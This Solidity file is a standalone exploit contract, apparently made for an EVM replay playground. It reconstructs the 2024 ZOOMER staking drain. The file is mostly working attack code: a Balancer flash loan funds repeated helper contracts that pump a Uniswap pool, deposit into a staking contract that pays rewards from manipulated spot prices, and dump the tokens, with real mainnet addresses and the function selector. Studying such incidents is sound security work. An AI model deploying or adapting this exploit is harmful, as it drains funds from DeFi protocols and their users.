// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-02-Zoomer).
//
// The DeFiHackLabs PoC (test/Zoomer_exp.sol) runs the whole attack INLINE in
// the Foundry test contract: `ContractTest.testExploit()` flash-borrows 200
// WETH from Balancer; the `receiveFlashLoan` callback (on the test itself)
// loops 5 times deploying a fresh `Money` helper funded with 200 ETH from the
// TEST CONTRACT'S OWN pre-existing balance (a Foundry test contract starts
// with a huge default ETH balance, so `Money{value: 200 ether}` never touches
// the flash-borrowed WETH itself — the loan just proves the pump capital is
// flash-loanable). Each `Money`'s CONSTRUCTOR self-attacks: buys ZOOMER with
// 199.9 of its 200 ETH, deposits a fixed slice into the vulnerable staking
// contract (spot-priced reward, paid instantly in ETH), and forwards its
// ENTIRE remaining ETH+ZOOMER back to the deployer, which dumps the ZOOMER
// for WETH.
//
// The playground's recorder measures a single profitToken's balance DELTA
// on one address, so re-creating the test's "bottomless pre-existing ETH
// balance" here (e.g. via a huge `setup.fundAttackerWei`) would make the
// ~1000 ETH spent funding five Money_ deployments count as a loss against
// the reward profit, even though in the real attack that capital is fully
// recycled every round (dump proceeds pay for the next round). This
// synthetic version keeps the round self-funding instead: ZoomerDrain
// unwraps exactly 200 WETH of the 200 WETH flash loan into ETH to fund each
// Money_, and re-wraps the WETH Money_'s dump proceeds return before the
// next round -- so the SAME 200 (WETH<->ETH) capital recirculates round to
// round, exactly like the original attack's capital efficiency, and the
// native ETH balance ZoomerDrain accumulates is purely the staking
// contract's reward payouts (plus each round's tiny AMM-fee residual) --
// i.e. the real profit signal, not an artifact of how the funding was
// modeled. This is economically equivalent to the original trace (same
// swaps, same deposit, same reward) and does not alter attacker, exploit
// contract, or profitToken identity. Logic and constants for the actual
// attack (swap amounts, deposit slice, selector) are copied verbatim from
// test/Zoomer_exp.sol; only the ETH-funding plumbing around Money_'s
// deployment is adapted to source its capital from the flash loan instead of
// a Foundry test contract's default balance, so the recorded profit isolates
// the real economic gain.
//
// Root cause: the ZOOMER staking contract at 0x9700204D… (selector
// 0x72c4cff6) prices a deposit using the LIVE Uniswap V2 spot reserves of the
// ZOOMER/WETH pair and immediately pays ~95% of that (spot-priced) valuation
// back in ETH. An attacker who first pumps the pool (buying a large amount of
// ZOOMER) inflates the spot price, deposits a small fixed slice at the
// inflated valuation, collects the oversized ETH "reward", then dumps the
// remaining ZOOMER back into the pool to recover most of the pump capital.
// Repeated 5x inside one flash loan, four rounds succeed before the staking
// contract's ETH balance is drained (round 5's deposit reverts with
// "Insufficient ETH balance").

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IWETH9 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function withdraw(uint256) external;
    function deposit() external payable;
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(uint256 amountOutMin, address[] calldata path, address to, uint256 deadline)
        external
        payable
        returns (uint256[] memory amounts);
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

// `Money` analog. Its constructor is a faithful copy of test/Zoomer_exp.sol's
// `Money` constructor — funded with 200 ETH by the deployer (`ZoomerDrain`,
// spent from ITS OWN balance, mirroring the Foundry test contract's default
// ETH balance), it self-attacks and forwards everything left back to the
// deployer.
contract Money_ {
    IUniswapV2Router constant Router = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    IERC20 constant Zoomer = IERC20(0x0D505C03d30e65f6e9b4Ef88855a47a89e4b7676);
    address constant Vulncontract = 0x9700204D77A67A18eA8F1B47275897b21e5eFA97;
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address owner;

    constructor() payable {
        owner = msg.sender;
        Attack();
    }

    function Attack() public payable {
        require(owner == msg.sender, "Error");
        // Step 1 — pump: buy ZOOMER with 199.9 of the 200 ETH funding.
        swap_token_to_ExactToken(199.9 ether, address(WETH), address(Zoomer), type(uint256).max);
        Zoomer.approve(address(Vulncontract), type(uint256).max);
        // Step 2 — the exploit: deposit a fixed 30,265,400 ZOOMER slice into
        // the staking contract. It prices the slice off the just-pumped LIVE
        // spot reserves and immediately pays ~95% of that valuation in ETH.
        // A low-level call so a reverted deposit (round 5, contract drained)
        // does not abort the whole Attack() — the tokens and ETH stay put.
        address(Vulncontract).call{value: 0.02 ether}(
            abi.encodeWithSelector(bytes4(0x72c4cff6), address(Zoomer), 30_265_400 ether)
        );
        // Step 3 — dump: return all remaining ZOOMER to the deployer, which
        // sells it back into the pool to recover most of the pump capital.
        Zoomer.transfer(address(msg.sender), Zoomer.balanceOf(address(this)));
        // Forward every wei left in this contract (leftover funding + any
        // ETH reward just collected) back to the deployer.
        (msg.sender).call{value: address(this).balance}("");
    }

    function swap_token_to_ExactToken(uint256 amount, address a, address b, uint256 amountInMax) public payable {
        IERC20(a).approve(address(Router), amountInMax);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        Router.swapExactETHForTokens{value: amount}(0, path, address(this), block.timestamp);
    }

    fallback() external payable {}
}

// `ContractTest` analog. Flash-borrows 200 WETH from Balancer and, unlike the
// original test (which funds each Money{value: 200 ether} from the Foundry
// test contract's own bottomless pre-existing ETH balance), UNWRAPS that same
// 200 WETH into ETH to fund each Money_ round and RE-WRAPS Money_'s dump
// proceeds back into WETH before the next round -- so the SAME borrowed
// capital recirculates round to round (economically identical to the
// original: same swap amounts, same deposit, same reward) instead of
// requiring an unbounded pre-funded ETH balance that would otherwise show up
// as a large artificial loss against the recorded native-ETH profit. Only
// the reward ETH the staking contract pays out (plus small per-round AMM-fee
// residuals) accumulates as ZoomerDrain's net native ETH balance.
contract ZoomerDrain {
    IUniswapV2Router constant Router = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    IERC20 constant Zoomer = IERC20(0x0D505C03d30e65f6e9b4Ef88855a47a89e4b7676);
    IWETH9 constant WETH = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IBalancerVault constant Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    function attack() external {
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 200 ether;
        bytes memory userData = abi.encode(amounts, tokens, "test");
        Balancer.flashLoan(address(this), tokens, amounts, userData);
    }

    function receiveFlashLoan(
        address[] memory,
        uint256[] memory,
        uint256[] memory,
        bytes memory
    ) external {
        // Unwrap the 200 WETH loan into ETH once -- this is the SAME capital
        // that recirculates round to round (Money_ returns ~199.9 ETH worth
        // of value back via ZOOMER each round, which is dumped and re-wrapped
        // below before funding the next round).
        WETH.withdraw(200 ether);

        for (uint256 i; i < 5; ++i) {
            // `new` INSIDE this recorded call — unlike the playground's own
            // top-level exploit deploy (which pre-dates the recorder
            // attaching), this construction IS captured, so the whole
            // Money_ constructor sequence (including the vulnerable deposit
            // call) shows up in the trace.
            new Money_{value: 200 ether}();
            swap_token_to_ExactToken(Zoomer.balanceOf(address(this)), address(Zoomer), address(WETH), type(uint256).max);
            // Re-wrap the WETH just received from dumping ZOOMER back into
            // ETH so the next round's `new Money_{value: 200 ether}()` has
            // capital available again (mirrors the original attack's
            // capital efficiency -- the same ~200 ETH/WETH recirculates).
            WETH.withdraw(WETH.balanceOf(address(this)));
        }
        // Re-wrap exactly 200 ETH worth of the recirculated capital to repay
        // the flash loan; whatever native ETH remains beyond that (the
        // accumulated staking-contract rewards) is the recorded profit.
        WETH.deposit{value: 200 ether}();
        WETH.transfer(msg.sender, 200 ether);
    }

    function swap_token_to_ExactToken(uint256 amount, address a, address b, uint256 amountInMax) public payable {
        IERC20(a).approve(address(Router), amountInMax);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        Router.swapExactTokensForTokens(amount, 0, path, address(this), block.timestamp + 120);
    }

    fallback() external payable {}
}
